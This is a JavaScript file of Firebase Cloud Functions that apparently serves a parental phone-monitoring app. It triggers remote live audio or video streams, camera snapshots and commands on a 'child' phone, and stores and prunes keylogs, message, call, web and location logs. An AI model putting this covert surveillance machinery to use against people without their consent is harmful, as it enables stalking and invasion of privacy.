const functions = require("firebase-functions");
const admin = require("firebase-admin");

const DB_INSTANCE = "apnasatthilko-default-rtdb";
const DB_URL = "https://apnasatthilko-default-rtdb.asia-southeast1.firebasedatabase.app";

if (!admin.apps.length) {
  admin.initializeApp({
    databaseURL: DB_URL
  });
}

/**
 * Helper: Clean up invalid FCM token from database
 */
async function cleanupInvalidToken(uid) {
  try {
    await admin.database().ref(`/users/${uid}/fcmToken`).remove();
    console.log(`Removed invalid FCM token for user: ${uid}`);
  } catch (err) {
    console.error(`Failed to remove invalid token for ${uid}:`, err);
  }
}

/**
 * Helper: Send FCM message with invalid token handling
 */
async function sendFcmSafe(uid, token, message) {
  try {
    const response = await admin.messaging().send(message);
    return response;
  } catch (err) {
    const code = err.code || err.errorInfo?.code || "";
    if (
      code === "messaging/invalid-registration-token" ||
      code === "messaging/registration-token-not-registered" ||
      code === "messaging/invalid-argument"
    ) {
      console.warn(`Invalid FCM token for ${uid}, removing from DB.`);
      await cleanupInvalidToken(uid);
    } else {
      console.error(`FCM send error for ${uid}:`, err);
    }
    return null;
  }
}

function hasChanged(before, after, fields) {
  if (!before.exists()) return true;
  const previous = before.val() || {};
  const current = after.val() || {};
  return fields.some((field) => previous[field] !== current[field]);
}

/**
 * Realtime Database Trigger: onStreamRequested
 * Triggers on /streams/{targetUid}/status on the correct database instance
 * Sends High-Priority FCM Data Push to wake up Child phone lock-screen.
 */
exports.onStreamRequested = functions.database
  .instance(DB_INSTANCE)
  .ref("/streams/{targetUid}/status")
  .onWrite(async (change, context) => {
    const targetUid = context.params.targetUid;
    const statusData = change.after.val();

    if (!statusData) {
      console.log(`Stream request removed for target: ${targetUid}`);
      return null;
    }

    if (!hasChanged(change.before, change.after, ["status", "streamType", "type", "sessionId"])) {
      return null;
    }

    const status = statusData.status || "";

    // If stream was stopped by parent, notify child to STOP and cleanup signaling session
    if (status === "STOPPED" || status === "DISCONNECTED") {
      const sessionId = statusData.sessionId;
      if (sessionId) {
        admin.database().ref(`/signaling/${sessionId}`).remove().catch((e) => console.error("Error removing signaling session:", e));
      }
      try {
        const userSnapshot = await admin.database().ref(`/users/${targetUid}`).once("value");
        const userData = userSnapshot.val();
        if (userData && userData.fcmToken) {
          const stopMsg = {
            token: userData.fcmToken,
            android: { priority: "high", ttl: 0 },
            data: { action: "STOP_STREAM", timestamp: String(Date.now()) }
          };
          await sendFcmSafe(targetUid, userData.fcmToken, stopMsg);
          console.log(`Sent STOP_STREAM FCM push to ${targetUid}`);
        }
      } catch (err) {
        console.error(`Error sending STOP_STREAM to ${targetUid}:`, err);
      }
      return null;
    }

    // Only process when parent explicitly REQUESTED a live stream
    if (status !== "REQUESTED") {
      console.log(`Ignoring status '${status}' for target: ${targetUid}`);
      return null;
    }

    const streamType = (statusData.streamType || statusData.type || "audio").toLowerCase();
    const hasVideo = streamType === "video";
    const sessionId = statusData.sessionId || `session_${targetUid}_${Date.now()}`;

    try {
      const userSnapshot = await admin.database().ref(`/users/${targetUid}`).once("value");
      const userData = userSnapshot.val();

      if (!userData || !userData.fcmToken) {
        console.error(`No FCM Token found for user: ${targetUid}`);
        return null;
      }

      const message = {
        token: userData.fcmToken,
        android: {
          priority: "high",
          ttl: 0
        },
        data: {
          action: "START_STREAM",
          streamType: streamType,
          hasVideo: hasVideo ? "true" : "false",
          sessionId: sessionId,
          timestamp: String(Date.now())
        }
      };

      const response = await sendFcmSafe(targetUid, userData.fcmToken, message);
      if (response) {
        console.log(`Successfully sent high-priority FCM push (${streamType}) to ${targetUid}:`, response);
      }
      return response;
    } catch (error) {
      console.error(`Error sending FCM push to ${targetUid}:`, error);
      return null;
    }
  });

/**
 * Realtime Database Trigger: onSnapshotRequested
 * Triggers on /streams/{targetUid}/snapshotRequest
 */
exports.onSnapshotRequested = functions.database
  .instance(DB_INSTANCE)
  .ref("/streams/{targetUid}/snapshotRequest")
  .onWrite(async (change, context) => {
    const targetUid = context.params.targetUid;
    const data = change.after.val();
    if (!data || data.status !== "REQUESTED") return null;
    if (!hasChanged(change.before, change.after, ["status", "cameraFacing", "requestId"])) return null;

    try {
      const userSnapshot = await admin.database().ref(`/users/${targetUid}`).once("value");
      const userData = userSnapshot.val();
      if (userData && userData.fcmToken) {
        const message = {
          token: userData.fcmToken,
          android: { priority: "high", ttl: 0 },
          data: {
            action: "WAKEUP",
            type: "SNAPSHOT",
            facing: data.cameraFacing || "back",
            timestamp: String(Date.now())
          }
        };
        await sendFcmSafe(targetUid, userData.fcmToken, message);
        console.log(`Sent SNAPSHOT FCM wake-up to ${targetUid}`);
      }
    } catch (err) {
      console.error(`Error sending snapshot FCM to ${targetUid}:`, err);
    }
    return null;
  });

/**
 * Realtime Database Trigger: onCommandSent
 * Triggers on /commands/{targetUid}/{command}
 */
exports.onCommandSent = functions.database
  .instance(DB_INSTANCE)
  .ref("/commands/{targetUid}/{command}")
  .onWrite(async (change, context) => {
    const targetUid = context.params.targetUid;
    const command = context.params.command;
    const data = change.after.val();
    // Ignore deletes and rewrites that do not change the command payload.
    if (!data) return null;
    if (!hasChanged(change.before, change.after, ["timestamp", "status", "command", "requestId"])) return null;

    try {
      const userSnapshot = await admin.database().ref(`/users/${targetUid}`).once("value");
      const userData = userSnapshot.val();
      if (userData && userData.fcmToken) {
        const message = {
          token: userData.fcmToken,
          android: { priority: "high", ttl: 0 },
          data: {
            action: "WAKEUP",
            type: "COMMAND",
            command: command,
            timestamp: String(Date.now())
          }
        };
        await sendFcmSafe(targetUid, userData.fcmToken, message);
        console.log(`Sent COMMAND FCM wake-up (${command}) to ${targetUid}`);
      }
    } catch (err) {
      console.error(`Error sending command FCM to ${targetUid}:`, err);
    }
    return null;
  });

/**
 * Realtime Database Trigger: onSecurityAlertCreated
 * Triggers on /alerts/{childUid}/{alertId}
 * Sends High-Priority FCM Push Alert to the Parent phone immediately.
 */
exports.onSecurityAlertCreated = functions.database
  .instance(DB_INSTANCE)
  .ref("/alerts/{childUid}/{alertId}")
  .onCreate(async (snapshot, context) => {
    const childUid = context.params.childUid;
    const alert = snapshot.val();
    if (!alert) return null;

    try {
      const childSnap = await admin.database().ref(`/users/${childUid}`).once("value");
      const childData = childSnap.val();
      if (!childData || !childData.parentId) {
        console.log(`No parentId found for child: ${childUid}`);
        return null;
      }

      const parentId = childData.parentId;
      const parentSnap = await admin.database().ref(`/users/${parentId}`).once("value");
      const parentData = parentSnap.val();
      if (!parentData || !parentData.fcmToken) {
        console.log(`No FCM token for parent: ${parentId}`);
        return null;
      }

      const childName = childData.displayName || childData.name || "Child Phone";
      const alertTitle = alert.title || `🚨 Security Alert (${childName})`;
      const alertMsg = alert.message || "Security alert detected on device.";

      const message = {
        token: parentData.fcmToken,
        android: {
          priority: "high",
          notification: {
            title: alertTitle,
            body: alertMsg,
            sound: "default",
            channelId: "security_alerts_channel",
            priority: "max"
          }
        },
        data: {
          action: "SECURITY_ALERT",
          childUid: childUid,
          alertType: alert.type || "SIM_CHANGED",
          title: alertTitle,
          message: alertMsg,
          timestamp: String(alert.timestamp || Date.now())
        }
      };

      const response = await sendFcmSafe(parentId, parentData.fcmToken, message);
      console.log(`Successfully sent security alert FCM to parent ${parentId}:`, response);
      return response;
    } catch (err) {
      console.error("Error sending security alert FCM to parent:", err);
      return null;
    }
  });

/**
 * Scheduled Cloud Function: Daily auto-cleanup at 2:00 AM IST
 * Purges old notifications & media_gallery from Cloud Firestore (older than 24 hours)
 * and keeps Realtime Database pruned, fast, and 100% within free limits.
 */
exports.cleanupOldData = functions.pubsub
  .schedule("0 2 * * *")
  .timeZone("Asia/Kolkata")
  .onRun(async (context) => {
    console.log("Daily 2:00 AM IST Auto-cleanup started.");
    const ONE_DAY_MS = 24 * 60 * 60 * 1000;
    const oneDayCutoff = Date.now() - ONE_DAY_MS;
    const firestore = admin.firestore();

    // 1. Clean up old Notifications from Cloud Firestore (older than 24 hours)
    try {
      const notifParents = await firestore.collection("notifications").get();
      for (const parentDoc of notifParents.docs) {
        const itemsRef = parentDoc.ref.collection("items");
        const oldNotifs = await itemsRef.where("timestamp", "<", oneDayCutoff).get();
        if (!oldNotifs.empty) {
          const batch = firestore.batch();
          oldNotifs.docs.forEach((doc) => batch.delete(doc.ref));
          await batch.commit();
          console.log(`Deleted ${oldNotifs.size} old notifications for child: ${parentDoc.id}`);
        }
      }
    } catch (err) {
      console.error("Failed to prune Firestore notifications:", err);
    }

    // 2. Clean up old Media Gallery from Cloud Firestore (older than 24 hours)
    try {
      const mediaParents = await firestore.collection("media_gallery").get();
      for (const parentDoc of mediaParents.docs) {
        const itemsRef = parentDoc.ref.collection("items");
        const oldMedia = await itemsRef.where("dateAdded", "<", oneDayCutoff).get();
        if (!oldMedia.empty) {
          const batch = firestore.batch();
          oldMedia.docs.forEach((doc) => batch.delete(doc.ref));
          await batch.commit();
          console.log(`Deleted ${oldMedia.size} old media items for child: ${parentDoc.id}`);
        }
      }
    } catch (err) {
      console.error("Failed to prune Firestore media_gallery:", err);
    }

    // 3. Purge any lingering RTDB notifications & media_gallery nodes to guarantee 0 bytes RTDB bloat
    try {
      const rtdb = admin.database();
      await rtdb.ref("notifications").remove().catch(() => {});
      await rtdb.ref("media_gallery").remove().catch(() => {});
    } catch (err) {
      console.error("Failed to remove lingering RTDB nodes:", err);
    }

    // 4. Prune other RTDB history nodes older than 30 days
    const THIRTY_DAYS_MS = 30 * 24 * 60 * 60 * 1000;
    const cutoffTime = Date.now() - THIRTY_DAYS_MS;
    const db = admin.database();

    const nodesToPrune = [
      "whatsapp_logs",
      "youtube_history",
      "alerts",
      "call_logs",
      "sms_logs",
      "web_history",
      "network_history",
      "keylogs",
      "wifi_logs",
      "social_media_usage",
      "snapshots",
      "location_history"
    ];

    console.log(`Starting automated daily cleanup. Cutoff time: ${new Date(cutoffTime).toISOString()}`);

    for (const node of nodesToPrune) {
      try {
        const rootRef = db.ref(node);
        const childrenSnapshot = await rootRef.once("value");
        if (!childrenSnapshot.exists()) continue;

        const promises = [];
        childrenSnapshot.forEach((childSnap) => {
          const childUid = childSnap.key;
          const userLogsRef = db.ref(`${node}/${childUid}`);

          promises.push(
            userLogsRef
              .orderByChild("timestamp")
              .endAt(cutoffTime)
              .once("value")
              .then((snapshot) => {
                if (!snapshot.exists()) return null;
                const updates = {};
                snapshot.forEach((itemSnap) => {
                  updates[itemSnap.key] = null;
                });
                return userLogsRef.update(updates);
              })
              .catch((err) => {
                console.error(`Error pruning ${node}/${childUid}:`, err);
              })
          );
        });

        await Promise.all(promises);
        console.log(`Completed pruning for node: ${node}`);
      } catch (err) {
        console.error(`Failed to prune node ${node}:`, err);
      }
    }

    // Keep recording metadata and binary files on the same retention policy.
    // This is intentionally separate because recording metadata uses startTime,
    // while the other history nodes use timestamp.
    try {
      const recordingCutoff = Date.now() - (14 * 24 * 60 * 60 * 1000);
      const recordingRoot = db.ref("recordings");
      const recordingSnapshot = await recordingRoot.once("value");
      const recordingUpdates = {};
      recordingSnapshot.forEach((childSnap) => {
        childSnap.forEach((recordingSnap) => {
          const recording = recordingSnap.val() || {};
          if (Number(recording.startTime || 0) > 0 && Number(recording.startTime) < recordingCutoff) {
            recordingUpdates[`${childSnap.key}/${recordingSnap.key}`] = null;
          }
        });
      });
      if (Object.keys(recordingUpdates).length > 0) {
        await recordingRoot.update(recordingUpdates);
      }

      const bucket = admin.storage().bucket();
      const [recFiles] = await bucket.getFiles({ prefix: "recordings/" }).catch(() => [[]]);
      const [snapFiles] = await bucket.getFiles({ prefix: "snapshots/" }).catch(() => [[]]);
      const filesToDelete = [...(recFiles || []), ...(snapFiles || [])];

      await Promise.all(
        filesToDelete
          .filter((file) => Number(new Date(file.metadata.timeCreated || 0)) < recordingCutoff)
          .map((file) =>
            file.delete().catch((err) => console.error("Failed to delete storage file:", file.name, err))
          )
      );
      console.log(`Cloud Storage cleanup completed for cutoff: ${new Date(recordingCutoff).toISOString()}`);
    } catch (err) {
      console.error("Failed to clean up recordings and snapshots:", err);
    }

    // Clean up stale WebRTC signaling sessions older than 2 hours
    try {
      const TWO_HOURS_MS = 2 * 60 * 60 * 1000;
      const signalingCutoff = Date.now() - TWO_HOURS_MS;
      const signalingRef = db.ref("signaling");
      const sigSnap = await signalingRef.once("value");
      if (sigSnap.exists()) {
        const sigUpdates = {};
        sigSnap.forEach((item) => {
          const val = item.val();
          if (val && val.timestamp && val.timestamp < signalingCutoff) {
            sigUpdates[item.key] = null;
          }
        });
        if (Object.keys(sigUpdates).length > 0) {
          await signalingRef.update(sigUpdates);
          console.log(`Cleaned up ${Object.keys(sigUpdates).length} stale signaling sessions.`);
        }
      }
    } catch (err) {
      console.error("Failed to clean up stale signaling sessions:", err);
    }

    return null;
  });
